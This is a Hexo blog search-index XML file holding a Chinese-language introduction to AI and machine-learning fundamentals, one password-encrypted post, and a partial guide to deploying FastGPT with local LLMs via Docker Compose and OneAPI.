<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SecGPT 基础知识（一）</title>
      <link href="/2024/10/08/SecGPT1/"/>
      <url>/2024/10/08/SecGPT1/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>2023 年科技圈“最靓的仔”非 ChatGPT 莫属，它是大语言模型（Large Language Model，LLM，简称大模型）的一种，而 AI（Artificial Intelligence，人工智能）也再次成为业界热议的话题，并引发了资本领域的狂欢。但若不是专业领域出身的同学，面对机器学习、神经网络、决策式 AI、生成式 AI、大模型、GPT 等一堆概念的时候，很可能搞不清楚它们之间的层次关系，这将不利于对大模型的学习和理解。因此，有必要从宏观上先对 AI 基础知识进行一些介绍。</p><span id="more"></span><h1 id="早期发展：符号人工智能（Symbolic-AI）"><a href="#早期发展：符号人工智能（Symbolic-AI）" class="headerlink" title="早期发展：符号人工智能（Symbolic AI）"></a>早期发展：符号人工智能（Symbolic AI）</h1><p>AI 作为计算机科学的一个分支，大概出现在20世纪50年代，核心目的是让计算机能够像人类一样思考、学习、推理、决策、交流，更好地帮助人类解决复杂的问题，变得更加有用。</p><p>从 50 年代到 80 年代中前期，是 AI 发展的早期阶段，也称为“符号人工智能（Symbolic AI）”。所谓“符号”，可以简单的理解为语句和规则。这个时期计算机的智能性主要依赖于领域专家和程序员将现实生活中的知识转换为规则，然后进行编程实现（比如一条规则可能就对应一组 if…else…的代码），而大量规则则就形成了一个知识库，可用于计算机的推断和决策。因此，“符号人工智能”也被称为“基于规则的人工智能”。</p><p>在 AI 发展的早期阶段，符号人工智能曾经发挥过重要作用，典型代表如 IBM Watson System（医生机器人专家系统）。但随着人工智能的发展，它的局限性也逐渐被人们更深刻的认识到，核心问题在于它非常依赖系统构建者的专业领域知识，需要大量的手工编码来构建和维护复杂的知识库，难以处理那些模糊性的问题。符号人工智能的优点和局限如下表所示：</p><table><thead><tr><th align="left">做的还行</th><th align="left">不太行</th></tr></thead><tbody><tr><td align="left">在人类已知的、广泛的、通用的领域中解决问题、制定决策、满足约束，如领域专家系统、辅助编程系统等</td><td align="left">过于依赖专家经验的转化，复杂的代码开发和维护，边际效应日趋降低</td></tr><tr><td align="left"></td><td align="left">在自然语言处理、语音处理、视觉处理等领域，没有取得明显的效果</td></tr><tr><td align="left"></td><td align="left">系统很难知道经验边界之外的事情，难以做出合理、准确的预测</td></tr><tr><td align="left"></td><td align="left">大部分算法不是分布式的，难以扩展；即使考虑了分布式，也受限于当时的软件、硬件和网络能力</td></tr></tbody></table><p>随着各个业务领域信息技术的快速发展，这种局限性体现得越来越明显，性价比也越来越低，因此符号人工智能获得的研究资金日益减少，社会对 Al 也从狂热的追捧变为冷淡的唏嘘，AI 的发展进入了瓶颈期。不过，符号人工智能作为经典的 AI 技术，通过对人类知识进行规则化的转换，能较好地帮助研究者深入理解人类知识的表示和处理方法，仍然具有学术上的研究价值。</p><p>穷则思变，一种新的方法随即被提出，取代了符号人工智能，并逐渐成为人工智能领域的主流方法，这就是“机器学习”。</p><h1 id="主流方法：机器学习（Machine-Learning）"><a href="#主流方法：机器学习（Machine-Learning）" class="headerlink" title="主流方法：机器学习（Machine Learning）"></a>主流方法：机器学习（Machine Learning）</h1><p>机器学习 （Machine Learning，ML），是人工智能的一个发展分支，出现于上世纪 80 年代中后期，并逐渐成为 AI 领域的主流方法。它的核心思想是让计算机从数据中学习（训练）规律和模式，然后在实际的任务中进行计算、预測、决策、优化，是一种“数据驱动的人工智能”。数提是机器学习的核心要素之一，可以是结构化（如SQL 数据库中的二维表），也可以是非结构化或半结构化（如文本、HTML、XML、语音、图像等）。平时我们常常提到的“神经网络”“深度学习”“有监督““无监督”“卷积网络”“分类”“聚类”“大模型”等诸多概念，其实都属于机器学习这个领域。</p><p>一般可以通过如下的维度来看待机器学习：</p><ul><li>发展阶段的维度：如统计机器学习阶段、神经网络机器学习阶段、大语言模型机器学习阶段等。</li><li>任务目标的维度：如分类、聚类、回归、排名、降维、优化、密度估计等。</li><li>训练方法的维度：如有监督学习、无监督学习、半监督学习、基于人类反馈的强化学习等。</li><li>学习算法的维度：如线性回归、逻辑回归、决策树、K-means 聚类、支持向量机（SVM）、卷积神经网络（CNN）、循环神经网络（RNN）、朴素贝叶斯等。</li><li>模型原理维度：如几何模型、逻辑模型、网络模型、概率模型等。</li></ul><h2 id="发展阶段维度"><a href="#发展阶段维度" class="headerlink" title="发展阶段维度"></a>发展阶段维度</h2><p>机器学习是一个不断发展的过程，每个发展阶段都有其独特的特点和里程碑。虽然发展阶段并没有完全一致的划分原则，但按照“统计机器学习”“神经网络机器学习”和“大语言模型”这三个阶段来划分一般不会引起太大的争议。</p><ul><li>统计机器学习 Statistical Al<ul><li>它是一种基于概率和统计理论的机器学习方法，利用统计学原理，对数据进行分析和建模，用于预测未来趋势和行为。</li><li>应用大量数据来训练模型，通过统计学技术来进行模式识别和预测，如朴素贝叶斯、决策树等，广泛应用于文本分类、图像识别等任务。</li></ul></li><li>神经网络机器学习 Deep Learning<ul><li>它是一种基于人工神经网络的机器学习方法，自 21 世纪初期得到快速发展，Google AlphaGo 将基于神经网络的机器学习推向了高潮。神经网络通过模拟人类的神经系统，从训练数据中抽取特征进行学习和预测，广泛应用于图像分析、语音识别、自然语言处理等各种任务场景中。</li><li>通过构建深层神经网络模型，实现了对复杂的、非线性关系的建模能力，如 CNN、RNN、LSTM 等，在图像识别、语音识别和 NLP 等领域取得显著成果。</li></ul></li><li>大语言模型 LLM&#x2F;GPT<ul><li>它实际上是神经网络的一个发展分支，也是机器学习的最新阶段，自 2020 年左右开始得到快速发展，并因 ChatGPT 而间名于世。当前的主流大模型主要基于 Transformer 架构 （Transformer 是 Google 在 2017 年发表的“Attention is allyou need”论文中提出的一种神经网络架构），一股拥有超大规模的参致，基于超大规模的数据进行训练和学习，在各种类型的自然语言处理任务中（如问答系统、语言翻译、情感分析、命名实体识别等）取得令人惊叹的效果，尤其是文本生成类任务，目前已进一步扩展到音频、图像、视频等领域，被认为是实现通用人工智能（Artificial General Intelligence，AGI）的最可能技术路线。</li><li>基于 Transformer 架构，基于大规模语料进行训练、微调和提示工程，强大的语义理解和生成能力，应用于文本生成、情感识别、机器翻译等各类 NLP 任务。</li></ul></li></ul><p>不过，用“阶段”这个词可能会让人误以为早期阶段的技术已经不再发展，这是一种误解。实际上它们各自仍在发展中，而且都有广泛的应用和前景。在不同领域和任务中，也有着不同的优点和劣势，需要根据具体的问题，以及拥有怎样的数据，来选择合适的方法和技术。</p><h2 id="任务目标维度"><a href="#任务目标维度" class="headerlink" title="任务目标维度"></a>任务目标维度</h2><p>所谓任务目标，就是我们想要利用机器学习去解决什么类型的问题，完成什么类型的任务。问题和任务不同，适用的模型和算法往往也不同，下面以分类、聚类、回归几种任务目标为例来介绍，其他不过多展开了。</p><h3 id="分类和聚类"><a href="#分类和聚类" class="headerlink" title="分类和聚类"></a>分类和聚类</h3><p>“分类”和“聚类”是两个常见的任务类型。</p><ul><li>分类：根掘祥本已知的特征风性，将样本在已有既定的分类规则下进行归类。适用于分类任务的代表算法如逻辑回归、决策树、朴素贝叶斯等。</li><li>聚类：根据样本已知的特征属性，将样本在没有既定的分类规则下进行归类。适用于聚类任务的代表算法如 K-means 等。</li></ul><p>在机器学习和数据科学中，还有几个与分类&#x2F;聚类强相关的基础性概念。</p><ul><li>样本（Sample）：样本是从总体数据中抽取的部分个体数据，是用来训练模型、推断总体特性的一个有限的数据集合，可进一步分为“有标签样本”和“无标签样本”。在数据结构方面，结构化、非结构化、半结构化均有可能。</li><li>特征（Feature）：特征用于描述或表征样本在不同维度上的信息，代表了数据的内在规律，也称为属性，是模型的输入部分。特征的选择对于模型的表现往往有着至关重要的影响。</li><li>标签（Label）：标签是希望模型预测或学习的目标变量，是每个样本的已知结果或类别归属，通常用于有监督学习任务的训练和验证，是模型的输出部分。</li><li>数据集（Dataset）：效据集可以理解为样本的集合，通常由一系列记录组成，每个记录包含若干特征和零个、一个或多个标签。数据集能够进一步细分为训练数据集、验证数据集、测试数据集等。</li></ul><p>模型的训练就是根据已知样本的特征与标签之间的关系构建出一个预测模型；而模型的推理则是使用该预测模型基于来知样本的特征进行标签预测。</p><center>    <img src="/img/SecGPT1/FrCL3XyJcjhf-ZNd5480PglSR9mQ.png" width="850"></center><p>基于上图给出的这个数据集，我们看看分类和聚类的任务有何不同。</p><ul><li>分类任务：请根据以上数据集，对每位同学进行挂科与否的分类。其中，分类规则是明确的：1）总成绩低于60分，归类到“挂科”类别中；2）总成绩高于60分，归类到“没挂”类别中；3）总成绩&#x3D;0.5”平时成绩+0.5”期末成绩。</li></ul><center>    <img src="/img/SecGPT1/Fuk2W7T_ukBCNjyDcSZInm7wnGM9.pngyJcjhf-ZNd5480PglSR9mQ.png" width="850"></center><ul><li>聚类任务：请根据以上数据集，请把各位同学分到不同的小组中。注意，现在只有成绩数据，却没有明确的分类规则的，该如何归类呢？不同的人可能会有不同的归类方法，比如下图中就可能会因为“学霸&#x2F;学渣”和“有救&#x2F;没救”的原则，把每个同学分到不同的组。</li></ul><center>    <img src="/img/SecGPT1/FhW8nJ0HoMxCQE9HnDLT2D-QrJlu.png" width="850"></center><h3 id="回归"><a href="#回归" class="headerlink" title="回归"></a>回归</h3><p>分类和聚类，本质上其实都是对事物进行归类。用数学语言描述，就是把空间&#x2F;平面中一个个的点划分到不同的集合中，是一种处理离散型的随机变量问题。但现实生活中还有一些任务，此如预测房价、股价、温度、雨量等，这类任务是根据已有的数据和经验来预测未来的目标结果，用数学语言描述，是对因变量（结果）和自变量（原因）之间的关系进行建模，基于一个或多个自变量的变化来预测因变量的变化，在坐标轴上体现为直线、曲线、区域等图形，是一种处理连续型随机变量的问题，这类任务叫做回归。网上有一句有点拗口但比较精辟的总结：<strong>回归线是一条线或曲线，它穿过目标预测图上的所有数据点，以使数据点和回归线之间的垂直距离最小。</strong></p><p>回归也有多种类型，对应不同的算法：</p><ul><li>线性回归：对自变量和因变量建立一种线性的关系模型。</li><li>逻辑回归：对自变量和因变量建立一种S型函数或 Logistic 函数的关系模型。</li><li>决策树回归：构建一棵决策树（比如二叉树）。一个样本从根节点（root）出发，一定会走到某一个叶子节点，而叶子节点的值则代表这棵决策树对这个样本的预测结果。</li><li>随机森林回归：创建了一个森林，并使它拥有某种方式的随机性。“森林”是更多“树”的集成，随机森林回归可以看作更大范图、更复杂多变的决策树回归的集成。</li></ul><center>    <img src="/img/SecGPT1/FqS0AfEoZ4VTndET4wZ9A6g93GOi.png" width="850"></center><p>特别说明一下，逻辑回归和决策树回归也常常应用到分类任务中。除了上述提到的这些回归算法，还有多项式回归、支持向量机回归等其他算法，不再展开。</p><h2 id="训练方法维度"><a href="#训练方法维度" class="headerlink" title="训练方法维度"></a>训练方法维度</h2><p>所谓训练方法，就是我们让机器如何从浩瀚的数据中学习到有用的知识和规律，这和人类自身的学习过程有很多相似之处。不同的任务要求和数据特征，可能要采用不同的训练方法，或者多种训练方法的组合。</p><h3 id="有监督学习（Supervised-Learning）"><a href="#有监督学习（Supervised-Learning）" class="headerlink" title="有监督学习（Supervised Learning）"></a>有监督学习（Supervised Learning）</h3><p>有监督学习是基于有属性标签的样本数据进行模型训练。标签的本质是表征样本教据和目标结果之间的联系，训练的过程就是要提取出样本数据的特征，根据标签建立特征值和目标结果的函数映射关系。通过这种不断地学习和训练过程，让这种映射越来越准确（即拟合的越来越好），最终实现对新数据进行预测。有监督学习的主要挑战是获取具有准确标签信息的样本数据，对训练样本的标注往往需要花费大量人工成本。</p><p>有监督学习通常用在分类和回归任务中。</p><ul><li>分类任务场景：比如识别垃圾短信和垃圾邮件，都是先通过对一些历史短信和邮件做垃圾分类的标记，然后基于这些带有标记的数据进行模型训练。训练结束后，当获取到新的短信或是新的邮件时，就可以让模型进行分析和匹配，来识别此短信或邮件是或是不是垃圾类别。</li><li>回归任务场景：比如要预测公司的净利润，可以通过历史上公司的利润值，以及跟利润相关的指标因子，比如营业收入、资产负债、管理费用等，训练出利润与因子的回归模型。训练结束后，输入新的指标因子来预测公司的利润。</li></ul><h3 id="无监督学习（Unsupervised-Learning）"><a href="#无监督学习（Unsupervised-Learning）" class="headerlink" title="无监督学习（Unsupervised Learning）"></a>无监督学习（Unsupervised Learning）</h3><p>无监督学习是基于无标签的样本数据进行模型训练。和有监督学习不同，由于样本数据没有预定的标签信息，模型只好自行寻找数据在不同维度上的内在规律。打个不完全恰当的比喻，有监督学习可以比作“科班出身”或“黄埔军校”，无监督学习则可以比作“野路子”或“土八路”，但“土八路”的战斗力可未必弱于“黄埔军校”。另外，正是因为不需要对训练样本数据打标签，相对有监督学习，数据的获取成本比较低，当然致数据质量也更难保证。</p><p>无监督学习常用在聚类任务上。比如通过客户的消费行为（消费次数、最近消费时间、消费金额）指标，来对客户数据进行分层归类：</p><ul><li>第一类，重要价值客户，潜在特征是最近消费时间近、消费频次和消费金额都很高。</li><li>第二类，重要保持客户，潜在特征是最近消费时间较远，但消费频次和金额都很高，说明这是个一段时间没来的忠诚客户，需要主动和他保持联系。</li><li>第三类，重要发展客户，潜在特征是最近消费时间较近、消费金额高，但频次不高，忠诚度可能不高，算是有潜力的用户，应该重点发展。</li><li>第四类，重要挽留客户，潜在特征是最近消费时间较远、消费频次不高，但历史消费金额高，可能是将要流失或者已经要流失的用户，应该启动挽留措施。</li></ul><p>以上这些可用于分类的潜在特征，不是人为提前设定好的，而是由模型算法根据历史数据自己学习到了某种规律，这是无监督学习最重要的特点。</p><h3 id="半监督学习（Semi-Supervised-Learning）"><a href="#半监督学习（Semi-Supervised-Learning）" class="headerlink" title="半监督学习（Semi-Supervised Learning）"></a>半监督学习（Semi-Supervised Learning）</h3><p>半监督学习是有监督学习和无监督学习相互结合的一种训练方法，实现更优的分类，回归和聚类效果。在实际使用中，可以首先通过无监督学习对训练样本进行基于内在特征规律的聚类。以降低人工进行分类的成本。然后，基于聚类后的数据进行标注，让模型再进行有监督的训练，生成最终的预测模型。通过将两种训练方式进行结合，取得更均衡的成本和效果表现。</p><p>举一个在数据安全领域的应用方式。在《中华人民共和国数据安全法》、《数据安全能力成熟度模型》（GB&#x2F;T-37988）、以及政府、金融、交通、运营商等多个行业规范中，都要求对数据基于分类分级的保护。传统的数据分类分级方式主要基于人工来对数据的类别和级别进行标注。但在实际生产环境中，数据规模是巨大的，而且还在持续高速增长中，依靠人工进行分类分级的难度非常高，效率也比较低。因此，可以考虑基于半监督学习的方法训练一个分类分级的机器学习模型出来，用模型提升分类分级工作的效事。训练方法如下：</p><ul><li>第一步，准备训练样本集，目前以关系型数据为主。</li><li>第二步，通过无监督学习，根据数据内容对相似特征的数据进行自动聚类。</li><li>第三步，接下来数据工程师可以介入了，对聚类后的数据进行批量标注，标注后的数据就能进行有监督的学习了，构建生成数据分类分级的标签推荐模型。</li><li>第四步，将分类分级标签推荐模型部署在生产环境中，扫描出生产数据作为模型输入，最终输出分类分级标签的推荐信息。</li></ul><p>这是半监督学习的一个应用实例，这个过程本质就是通过机器学习把数据分类分级工作中的人工消耗尽可能降低，并提升分类分级标签标注的准确性。</p><h3 id="强化学习（Reinforcement-Learning）"><a href="#强化学习（Reinforcement-Learning）" class="headerlink" title="强化学习（Reinforcement Learning）"></a>强化学习（Reinforcement Learning）</h3><p>强化学习，特别是基于人类反馈的强化学习 （RLHF, Reinforcement Learning from Human Feedback），是一种更复杂、更综合的训练方法，它强调让模型与外界不断进行交互和反馈，通过某种预设的奖励信号（尤其是人类对预测结果的优劣评判），来诱导训练的方向，优化模型的预测和决策效果。强化学习经常用于博弈类游戏（如AlphaGo），无人驾驶、机器翻译、聊天机器人等场景。</p><p>2022年，OpenAI 发表了一篇论文 - 《Training language models to follow instructions with human feedback (结合人类反馈信息来训练语言模型使其能理解指令）》，专门阐述了 RLHF 对 GPT 模型训练的价值。在此之前，传统的语言模型通常只能生成符合语法规则的句子，但内容未必非常符合用户的意图、价值观或表达习惯，说白了就是“不像人话”。为了解决这个问题，于是便引入一种基于人类的反馈来微调语言模型的方法，以更好地遵循用户的意图、指令、偏好、价值观，生成更准确、更有逻辑和连贯性、更具可读性的输出。ChatGPT 所带来的惊人效果，更似人类的表现，使得 RLHF 引起了业界的广泛关注。</p><p>以上四种训练方式的基本思路，汇总如下图所示：</p><center>    <img src="/img/SecGPT1/FvbVFMHCor-irGHd6OJSnW-SKval.png" width="850"></center><h2 id="学习算法维度"><a href="#学习算法维度" class="headerlink" title="学习算法维度"></a>学习算法维度</h2><p>计算机算法指的是一系列明确定义的和可计算的步骤，用于解决特定的问题或执行特定的任务。那么，机器学习算法就是从数据中学习和构建出一种规律和模式，来实现分类、聚类、回归等各式各样的目标任务。机器学习的算法非常丰富，常见如线性回归、逻辑回归、决策树、K-means聚类、支持向量机（SVM）、卷积神经网络（CNN）、循环神经网络（RNN）、朴素贝叶斯等。选择何种算法，需要根据具体的问题类型、数据类型、数据量级、计算资源等因素进行选择。使用不合适的算法，可能难以取得理想的效果。</p><p>那么，在实际应用中如何选择不同的学习算法呢？一般可以参考几个方面，但一定不要绝对地来看：</p><ul><li>问题类型：比如分类问题，往往可以选择辑回归、决策树、K-means 等算法；如果是回归类问题，线性回归就是常用的算法。</li><li>数据类型：比如数据是图像，可以选择 CNN；如果数据是序列致据，则可以选择 RNN 或 LSTM。</li><li>数据量：一般来说，比如随机森林、线性回归这样的算法就比较适合大数据量的处理，而支持向量机、K-means 这样的算法则更适合小数据样本。</li><li>计算资源：一般来说，复杂的算法需要更多的计算资源，例如使用了神经网络结构的算法；简单的算法需要的计算资源较少，例如线性回归或逻辑回归。</li><li>训练时间：有些算法的训练时间很长，例如神经网络；有些算法的训练时间较短，例如线性回归。这有时候会影响我们对算法的选择。</li><li>模型解释性：有时候需要一个可以解释的模型，以便可以更容易地理解模型的决策过程，在这种情况下，我们可能会选择决策树或线性回归等可以提供解释的算法。</li></ul><h2 id="模型原理维度"><a href="#模型原理维度" class="headerlink" title="模型原理维度"></a>模型原理维度</h2><p>这个维度指的是根据几何学、逻辑学、统计学、概率论、网络结构等不同的学术原理设计出不同的模型。</p><ul><li>几何模型：基于几何学原理的模型，可以用于描述和分析空间中的物体或现象之间的关系。比如线性回归模型可以用于预测两个变量之间的关系，基于几何距离的聚类算法可以用于图像分割和目标识别等。</li><li>逻辑模型：基于逻辑学原理的模型，可以用于描述和分析事件之间的逻辑关系（比如“因为……所以……”就是一种典型的因果逻辑）。逻辑模型可以用于知识表示、推理和决策等领域。比如布尔逻辑模型（二分类、多分类、决策树）常常用于分类问题。</li><li>概率模型：基于概率论原理的模型，可以用于描述和分析随机事件之间的概率关系。概率模型可以用于概率推理、贝叶斯统计、自然语言处理等领域。比如贝叶斯网络可以用于分类和回归问题，而马尔可夫链可以用于自然语言处理中的语言模型和机器翻译等。</li><li>网络模型：基于网络结构的模型，可以用于描述和分析复杂系统中的相互作用和关系。比如社交网络分析中的图模型可以用于分析用户之间的联系和影响，知识图谱中的图模型可以用于表示实体之间的关系和语义信息等，神经网络或深度神经网络则广泛应用于自然语言处理、图形处理、语音处理等领域中。</li></ul><p>我们对上述划分方式有一个大致的了解即可。这里单独说说网络模型中的神经网络结构，当下已经广泛使用的 CNN、LSTM、RNN，以及大模型时代的 Transformer，都属于神经网络结构。神经网络 （Neural Networks，NN）通过对人类大脑神经元网络的模拟实现对信息的处理。神经网络由大量的节点（也称为神经元）相互连接而成，节点接收输入井被激活来输出信号，而节点与节点之间的连接则实现了信息的传递。</p><p>最简单的神经网络是感知机，它是一个有着若干输入和一个输出的模型，如下图所示：</p><center>    <img src="/img/SecGPT1/Fqj5gfg3iFz_5vQOkZZvruCw9vj0.png" width="850"></center><p>首先，输入和输出之间是一种线性关系，线性函数形式为：</p><center>    <img src="/img/SecGPT1/Fnfz9PKbw2bwTXLFEN-QNo80Gzxr.png" width="850"></center><p>然后，输出结果再经过一个神经元激活函数，最终得到1或-1两个结果，激活函致形式为：</p><center>    <img src="/img/SecGPT1/FhMupWTrp9lVfd8JswUEuCdNW5UO.png" width="850"></center><p>但这个模型只能用于“非此即彼”的二元分类，无法用于复杂的非线性处理。于是在感知机模型的基础上扩展形成更复杂的神经网络，主要做了几件事：</p><ol><li>在输入层和输出层之间增加一个隐藏层，对输入数据进行非线性变换，模型的学习能力和知识实际上就体现在隐藏层中。</li><li>输出层不止一个神经元，可以有多个输出，让模型可以更灵活应用在分类、聚类、回归、降维等多种任务。</li><li>优化了激活函数，比如使用逻辑回归常用的 Sigmoid 函数替代简单但处理能力有限的Sign函数。然而，除了Sigmoid，还可以使用 Softmax、ReLU、tanh （x）函数等作为神经元激活函数。</li></ol><p>于是，神经网络就从简单的感知机变成下面这个更复杂的结构：</p><center>    <img src="/img/SecGPT1/FnJZOOj2vEUGseNSZ402Igrm5262.png" width="850"></center><p>为了进一步优化神经网络的能力，又出现了更复杂的深度神经网络结构（Deep Neural Networks，DNN），可以理解为拥有很多隐藏层的神经网络。DNN 中一般第一层为输入层，最后一层为输出层，中间都是隐藏层，如下图所示：</p><center>    <img src="/img/SecGPT1/Fgck0Lj1DnE7mSKddokykwJFOQ3_.png" width="850"></center><p>如果该神经网络中第 i 层的任意一个神经元节点，都与第 i+1 层的任意一个神经元节点相连接，这被称为全连接神经网络。虽然它看起来很复杂，但局部其实都是一个个的感知机，均由一个线性函数加上一个激活函数构成。一般情况下，深度神经网络的隐藏层越多，它能够学习和表示的复杂模式就越多，但所消耗的资源也越大。神经元之间的连接传递的信息就是权重 wi，神经网络可以通过训练对权重进行调节，换句话说，模型训练的核心工作就是调节权重。权重对是神经网络至关重要，模型的知识就蕴含在这些权重之中。</p>]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NLP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Framework of building SecLLM</title>
      <link href="/2024/03/31/SecLLM/"/>
      <url>/2024/03/31/SecLLM/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="76c98cdc7d91de20522fc44778703b119acb9844399c977a4224afa33eeecd53"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NLP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于本地大模型的 FastGPT 框架部署</title>
      <link href="/2024/03/08/FastGPT/"/>
      <url>/2024/03/08/FastGPT/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://fastgpt.in/">FastGPT</a> 是一款强大的 LLM + RAG 解决方案，本文记录了基于本地大模型搭建 FastGPT 框架的过程。</p><span id="more"></span><h1 id="整体框架说明"><a href="#整体框架说明" class="headerlink" title="整体框架说明"></a>整体框架说明</h1><center>    <img src="/img/FastGPT/sealos-fastgpt.png" width="850"></center><ul><li>整体框架由 4 部分组成，分别为数据库、FastGPT、OneAPI、大模型</li></ul><h2 id="FastGPT"><a href="#FastGPT" class="headerlink" title="FastGPT"></a>FastGPT</h2><ul><li>框架本体，默认使用 OpenAI 的大模型接口</li></ul><h3 id="开发组件依赖"><a href="#开发组件依赖" class="headerlink" title="开发组件依赖"></a>开发组件依赖</h3><ul><li>Docker</li><li>Node.js v18.x</li><li>pnmp 版本 8.x.x</li></ul><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><ul><li><p>MongoDB 用于存储 FastGPT 框架运行所需的数据</p></li><li><p>pgvector 用于存储知识库向量</p><table><thead><tr><th>环境</th><th>最低配置（单节点）</th><th>推荐配置</th></tr></thead><tbody><tr><td>测试</td><td>2c2g</td><td>2c4g</td></tr><tr><td>100w 组向量</td><td>4c8g 50GB</td><td>4c16g 50GB</td></tr><tr><td>500w 组向量</td><td>8c32g 200GB</td><td>16c64g 200GB</td></tr></tbody></table></li></ul><h2 id="OneAPI"><a href="#OneAPI" class="headerlink" title="OneAPI"></a>OneAPI</h2><ul><li>OneAPI 是大模型调用接口框架，负责对接大模型调用接口，提供权限控制和收费统计等功能</li></ul><h2 id="本地大模型"><a href="#本地大模型" class="headerlink" title="本地大模型"></a>本地大模型</h2><ul><li>提供的本地大模型接口需要符合 OpenAI 的接口规范</li><li>综合显存需求<ul><li>最少：32GB+</li><li>推荐：48GB+</li></ul></li></ul><h3 id="对话大模型"><a href="#对话大模型" class="headerlink" title="对话大模型"></a>对话大模型</h3><ul><li>Baichuan 2</li><li>ChatGLM 2&#x2F;3</li></ul><h3 id="Embedding-模型"><a href="#Embedding-模型" class="headerlink" title="Embedding 模型"></a>Embedding 模型</h3><ul><li>m3e-large</li></ul><h3 id="ReRank-模型"><a href="#ReRank-模型" class="headerlink" title="ReRank 模型"></a>ReRank 模型</h3><ul><li>bge-reranker-large</li></ul><h1 id="基于-Docker-Compose-的快速部署"><a href="#基于-Docker-Compose-的快速部署" class="headerlink" title="基于 Docker Compose 的快速部署"></a>基于 Docker Compose 的快速部署</h1><h2 id="部署本地模型-OneAPI"><a href="#部署本地模型-OneAPI" class="headerlink" title="部署本地模型 + OneAPI"></a>部署本地模型 + OneAPI</h2><ul><li><p>部署实例中使用的本地模型组合为 Baichuan2-7B-Chat + M3E-large + BGE-ReRanker-base</p></li><li><p>硬件资源和前置需求见下方分布式部署相关章节</p></li><li><p>在本地创建文件夹并下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> llm</span><br><span class="line"><span class="built_in">cd</span> llm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载 docker-compose.yml 文件</span></span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-DockerCompose/docker-compose.yml</span><br></pre></td></tr></table></figure></li><li><p>根据<code>docker-compose.yml</code>文件中的提示修改对应的信息</p></li><li><p>通过以下命令控制相关容器</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">docker compose up -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止</span></span><br><span class="line">docker compose down</span><br></pre></td></tr></table></figure></li></ul><h2 id="配置-OneAPI"><a href="#配置-OneAPI" class="headerlink" title="配置 OneAPI"></a>配置 OneAPI</h2><ul><li>登陆<code>http://&lt;gpu_server_ip&gt;:8000</code>，初始账号密码<code>root/123456</code> ，登陆成功后及时修改默认密码</li><li>点击<code>令牌</code>→<code>添加新的令牌</code>，输入名称，内部使用可设置<code>永不过期 + 设置无限额度</code></li><li>回到<code>令牌</code>，点击<code>复制</code>即可获取<code>Token</code></li><li>点击<code>渠道</code>→<code>添加新的渠道</code><ul><li>添加 Baichuan2-7B-Chat<ul><li>类型：<code>OpenAI</code></li><li>名称：<code>Baichuan2-7B-Chat</code>（随意）</li><li>模型：<code>Baichuan2-7B-Chat</code>（随意，FastGPT 配置文件中与之对应即可）</li><li>密钥：本地大模型接口的<code>SK-KEY</code> 值</li><li>代理：<code>http://&lt;gpu_server_ip&gt;:8001</code></li></ul></li><li>添加 M3E-large<ul><li>类型：<code>自定义渠道</code></li><li>Base URL：<code>http://&lt;gpu_server_ip&gt;:8002</code></li><li>名称：<code>M3E-large</code>（随意）</li><li>模型：<code>M3E-large</code>（随意，FastGPT 配置文件中与之对应即可）</li><li>密钥：本地模型接口的<code>SK-KEY</code>值</li></ul></li></ul></li></ul><h2 id="部署-FastGPT"><a href="#部署-FastGPT" class="headerlink" title="部署 FastGPT"></a>部署 FastGPT</h2><ul><li><p>在本地创建文件夹并下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> fastgpt</span><br><span class="line"><span class="built_in">cd</span> fastgpt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载相关文件</span></span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/FastGPT/docker-compose.yml</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/FastGPT/config.json</span><br></pre></td></tr></table></figure><ul><li>注意: docker-compose.yml 配置文件中 Mongo 为 5.x，部分服务器不支持，需手动更改其镜像版本为 4.4.24</li></ul></li><li><p>修改 docker-compose.yml 中的 OPENAI_BASE_URL（API 接口的地址，需要加&#x2F;v1）和CHAT_API_KEY（API 接口的凭证)</p></li><li><p>使用 OneAPI 